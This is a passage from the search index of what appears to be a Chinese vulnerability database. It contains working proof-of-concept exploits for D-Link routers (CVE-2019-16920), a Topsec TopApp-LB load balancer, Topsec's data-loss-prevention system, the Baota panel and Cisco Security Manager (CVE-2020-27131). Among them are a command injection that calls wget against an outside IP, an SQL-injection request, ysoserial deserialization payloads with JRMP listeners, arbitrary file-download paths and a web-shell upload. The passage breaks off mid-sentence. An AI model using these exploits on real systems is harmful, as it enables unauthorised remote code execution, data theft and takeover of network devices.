<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8D%8E%E7%A1%95/%E5%8D%8E%E7%A1%95RT-N13%20QIS_wizard.htm%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87/#_3","title":"\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff1a","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"CVE 2019 16920 D Link \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#d-linkrce","title":"D-Link\u8def\u7531\u5668\u66dd\u51faRCE\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","title":"\u7b80\u4ecb","text":"<p>Fortinet\u65d7\u4e0bFortiGuard\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u62ab\u9732\u4e86D-Link\u8def\u7531\u5668\u4e0a\u7684\u4e00\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","title":"\u76f8\u5173\u6587\u7ae0","text":"<p>https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html https://nosec.org/home/detail/3020.html </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","title":"\u6839\u636e\u4f5c\u8005\u62ab\u9732\u7684\u53d7\u5f71\u54cd\u578b\u53f7\u4e3a\uff1a","text":"<ul> <li>DIR-655</li> <li>DIR-866L</li> <li>DIR-652</li> <li>DHP-1565</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","title":"POC \u5982\u4e0b","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06\u4efb\u610f\u5b57\u7b26\u4e32\u53d1\u9001\u5230\u201cPingTest\u201d\u7f51\u5173\u63a5\u53e3\u6765\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u3002</p> <pre><code>POST /apply_sec.cgi HTTP/1.1\nHost: 192.168.232.128\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 131\nConnection: close\nReferer: http://192.168.232.128/login_pic.asp\nCookie: uid=1234123\nUpgrade-Insecure-Requests: 1\nhtml_response_page=login_pic.asp&amp;action=ping_test&amp;ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)\n</code></pre> <p>\u201c\u8be5\u6f0f\u6d1e\u59cb\u4e8e\u4e00\u6b21\u9519\u8bef\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002\u5f53\u6211\u4eec\u8981\u8fdb\u5165\u7ba1\u7406\u9875\u9762\u65f6\uff0c\u9700\u8981\u6267\u884c\u767b\u5f55\u64cd\u4f5c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u4f1a\u5bf9<code>apply_sec.cgi</code>\u9875\u9762\u53d1\u51fa<code>POST</code>\u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u64cd\u4f5c<code>ping_test</code>\u3002\u7814\u7a76\u540e\u53d1\u73b0\uff0c\u6211\u4eec\u53ef\u901a\u8fc7\u53c2\u6570<code>ping_ipaddr</code>\u6267\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u867d\u7136\u54cd\u5e94\u662f\u8fd4\u56de\u767b\u5f55\u9875\u9762\uff0c\u4f46\u64cd\u4f5c<code>ping_test</code>\u4ecd\u7136\u6267\u884c\u4e86\uff0c\u6211\u4eec\u901a\u8fc7\u53c2\u6570<code>ping_ipaddr</code>\u6ce8\u5165\u7684\u547d\u4ee4<code>echo 1234</code>\u6210\u529f\u6267\u884c\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u56de\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u201d </p> <p>\u4e13\u5bb6\u4eec\u53d1\u73b0\uff0c\u7531\u4e8e\u7cdf\u7cd5\u7684\u8eab\u4efd\u6743\u9650\u68c0\u67e5\uff0c\u5373\u4f7f\u65e0\u7528\u6237\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u7814\u7a76\u4eba\u5458\u57289\u670822\u65e5\u5411D-Link\u62a5\u544a\u4e86\u6f0f\u6d1e\uff0c\u800c\u5382\u5546\u5728\u4e24\u5929\u540e\u627f\u8ba4\u6f0f\u6d1e\u5b58\u5728\uff0c\u5e76\u5728\u4e09\u5929\u540e\u786e\u8ba4\u4e0d\u4f1a\u53d1\u5e03\u76f8\u5173\u8865\u4e01\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4ea7\u54c1\u90fd\u5df2\u7ecf\u5230\u4e86\u751f\u547d\u5468\u671f\u7684\u7ec8\u70b9\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/","title":"","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#_1","title":"\u5f71\u54cd\u8303\u56f4\uff1a","text":"<p>V1.2.8.0#xxx</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861 TopAPP-LB\u4ea7\u54c1\u65e7\u7248\u672c\u5728\u7ba1\u7406\u9762\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5177\u4f53\u4e3a\u5728\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u670d\u52a1\u60c5\u51b5 \u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528\u7cfb\u7edf\u68c0\u67e5\u8f93\u5165\u6761\u4ef6\u4e0d\u4e25\u683c\u7684\u7f3a\u9677\uff0c\u8fdb\u4e00\u6b65\u53ef\u83b7\u53d6\u90e8\u5206\u7cfb\u7edf\u672c\u5730\u4fe1\u606f\u3002</p> <p></p> <pre><code>POST /acc/clsf/report/datasource.php HTTP/1.1\nHost: localhost\nConnection: close\nAccept: text/javascript, text/html, application/xml, text/xml, */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\nAccept-Language: zh-CN,zh;q=0.9\nContent-Type: application/x-www-form-urlencoded \n\nt=l&amp;e=0&amp;s=t&amp;l=1&amp;vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+&amp;gid=0&amp;lmt=10&amp;o=r_Speed&amp;asc=false&amp;p=8&amp;lipf=&amp;lipt=&amp;ripf=&amp;ript=&amp;dscp=&amp;proto=&amp;lpf=&amp;lpt=&amp;rpf=&amp;rpt=@\u3002\u3002\n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#3","title":"3\u3001\u5f71\u54cd\u7248\u672c","text":"<p>V1.2.8.0#xxx \uff0c\u8be5\u7248\u672c\u5b58\u5728\u4e8e 2014\u5e74\u4e4b\u524d\u9500\u552e\u7684\u4ea7\u54c1\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#4","title":"4\u3001\u4fee\u590d\u5efa\u8bae","text":"<p>\u5982\u60a8\u6b63\u5728\u4f7f\u7528 TopAPP-LB\u4ee5\u4e0a\u7248\u672c\u4ea7\u54c1\uff0c\u8bf7\u8054\u7cfb\u5929\u878d\u4fe1\u5f53\u5730\u6280\u672f\u56e2\u961f\u6216\u8005\u5b98\u65b9\u670d\u52a1\u70ed\u7ebf\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/","title":"\u5929\u878d\u4fe1\u6570\u636e\u9632\u6cc4\u6f0f\u7cfb\u7edf\u8d8a\u6743\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u2f46\u9700\u767b\u5f55\u6743\u9650,\u7531\u4e8e\u4fee\u6539\u5bc6\u7801\u5904\u672a\u6821\u9a8c\u539f\u5bc6\u7801,\u4e14/?module=auth_user&amp;action=mod_edit_pwd \u63a5\u2f1d\u672a\u6388\u6743\u8bbf\u95ee,\u9020\u6210\u76f4\u63a5\u4fee\u6539\u4efb\u610f\u2f64\u6237\u5bc6\u7801\u3002:\u9ed8\u8ba4superman\u8d26\u6237uid\u4e3a1\u3002 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"\u5b9d\u5854\u9762\u677fphpMyAdmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>Linux\u9762\u677f7.4.2 Windows\u9762\u72486.8</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u8bbf\u95ee\uff1a</p> <pre><code>http://ip:888/pma\n</code></pre> <p>\u5373\u53ef\u6210\u529f\u8fdb\u5165phpMyAdmin\u7ba1\u7406\u754c\u9762 \uff08\u9700\u8981\u5b89\u88c5\u4e86phpmyadmin\uff09</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/","title":"CVE 2020 27131 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#cve-2020-27131-poc","title":"CVE-2020-27131 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#_1","title":"\u7b80\u4ecb","text":"<p>\u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u662f\u4e00\u4e2a\u4f01\u4e1a\u7ea7\u5b89\u5168\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u63d0\u4f9b\u5bf9\u601d\u79d1\u5b89\u5168\u548c\u7f51\u7edc\u8bbe\u5907\u7684\u4e86\u89e3\u548c\u63a7\u5236\u3002Cisco Security Manager\u5728\u5e7f\u6cdb\u7684Cisco\u5b89\u5168\u8bbe\u5907\u4e2d\u63d0\u4f9b\u5168\u9762\u7684\u5b89\u5168\u7ba1\u7406\uff08\u914d\u7f6e\u548c\u4e8b\u4ef6\u7ba1\u7406\uff09\uff0c\u5305\u62ecCisco ASA\u81ea\u9002\u5e94\u5b89\u5168\u8bbe\u5907\uff0cCisco IPS\u7cfb\u5217\u4f20\u611f\u5668\u8bbe\u5907\uff0cCisco\u96c6\u6210\u670d\u52a1\u8def\u7531\u5668\uff08ISR\uff09\uff0cCisco\u9632\u706b\u5899\u670d\u52a1\u6a21\u5757\uff08FWSM\uff09 \uff0cCisco Catalyst\uff0cCisco\u4ea4\u6362\u673a\u7b49\u7b49\u3002Cisco Security Manager\u5141\u8bb8\u60a8\u6709\u6548\u5730\u7ba1\u7406\u5404\u79cd\u89c4\u6a21\u7684\u7f51\u7edc-\u4ece\u5c0f\u578b\u7f51\u7edc\u5230\u5305\u542b\u6570\u767e\u53f0\u8bbe\u5907\u7684\u5927\u578b\u7f51\u7edc\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#poc","title":"POC","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#secretservicejsp","title":"SecretService.jsp  \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<pre><code>java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" &gt; payload_CommonsBeanutils\ncurl -k --request POST --data-binary \"@payload_CommonsBeanutils\" https://[TARGET_HOST]/CSCOnm/servlet/SecretService.jsp\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#csjaasserviceservlet","title":"CsJaasServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>Compile JaasEncryptor.java and replace the b64Payload content:</p> <pre><code>import java.security.InvalidKeyException;\nimport java.util.Base64;\nimport com.cisco.nm.cmf.security.jaas.BlobCrypt;\n\npublic class JaasEncryptor {\n\n        public static void main(String args[]) {\n                String b64Payload = \"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MQAKVW5pY2FzdFJlZgAIMTAuMC4wLjIAAAG7AAAAAEBnvkQAAAAAAAAAAAAAAAAAAAB4\";\n\n                byte[] payload = Base64.getDecoder().decode(b64Payload);\n                byte[] key = new byte[]{-100, 76, -23, 87, 125, 0, 5, 94, 12, 76, 37, -84, 36, 78, 123, 5};\n\n                byte[] enc = BlobCrypt.encryptArray(payload, key);\n                System.out.println(\"Encrypted payload: \" + Base64.getEncoder().encodeToString(enc));\n                byte[] dec = BlobCrypt.decryptArray(enc, key);\n        }\n}\n</code></pre> <p>Prepare JRMP Listener:</p> <pre><code>java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 443\njava -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:443' | base64 -w0\n</code></pre> <p>Compile encrypted payload:</p> <pre><code>javac -cp [YOUR_PATH]]/server_jars_classes/jars.jar:./ JaasEncryptor2.java; java -cp [YOUR_PATH]/server_jars_classes/jars.jar:./ JaasEncryptor\n</code></pre> <p>Send payload to Servlet with parameters cmd=data + new line + data=[ENCRYPTED_PAYLOAD].</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#authtokenservlet","title":"AuthTokenServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>Prepare JRMP Listener:</p> <pre><code>java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\"\njava -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:1337' &gt; payload_JRMP1_2\n</code></pre> <p>Send request:</p> <pre><code>curl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.AuthTokenServlet\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#clientservicesservlet","title":"ClientServicesServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>Prepare JRMP listener:</p> <pre><code>java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\"\njava -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' &gt; payload_JRMP1_3\n</code></pre> <p>Send request:</p> <pre><code>curl -k --request POST --data-binary \"@payload_JRMP1_3\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.ClientServicesServlet\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#ctmservlet","title":"CTMServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<pre><code>java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" &gt; payload_CommonsBeanutils1_2\ncurl -i -s -k -X $'POST' -H $'Content-Type: application/octet-stream' -H $'CTM-URN: com-cisco-nm-vms-ipintel-IpIntelligenceApi' -H $'CTM-VERSION: 1.5' -H $'CTM-PRODUCT-ID: /C:/Program Files (x86)/CSCOpx/MDC/tomcat/vms/athena/WEB-INF/lib/' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'User-Agent: Java/1.8.0_222' -H $'Host: [TARGET_IP]' -H $'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2' -H $'Connection: keep-alive' --data-binary \"@payload_CommonsBeanutils1_2\" $'https://[TARGET_IP]/athena/CTMServlet'\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xdmconfigrequesthandler","title":"XdmConfigRequestHandler\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"<pre><code>GET /athena/xdmProxy/xdmConfig[RELATIVE_PATH_TO_FILE]\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xdmresourcerequesthandler","title":"XdmResourceRequestHandler \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"<pre><code>GET /athena/xdmProxy/xdmResources[RELATIVE_PATH_TO_FILE]?dmTargetType=TARGET.IDS&amp;dmOsVersion=7.&amp;command=editConfigDelta\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xmpfileuploadservlet","title":"XmpFileUploadServlet \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":"<p>Write a web shell e.g.</p> <pre><code>POST /cwhp/XmpFileUploadServlet?maxFileSize=100\n</code></pre> <p>Normal multi-part e.g. writing web shell in filename with*../../MDC/tomcat/webapps/cwhp/testme.jsp*.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#xmpfiledownloadservlet","title":"XmpFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d","text":"<pre><code>GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&amp;downloadDirectory=[RELATIVE_PATH_TO_DIRECTORY]&amp;readmeText=1\n</code></pre> <p>This will respond with a ZIP file containing all files from the 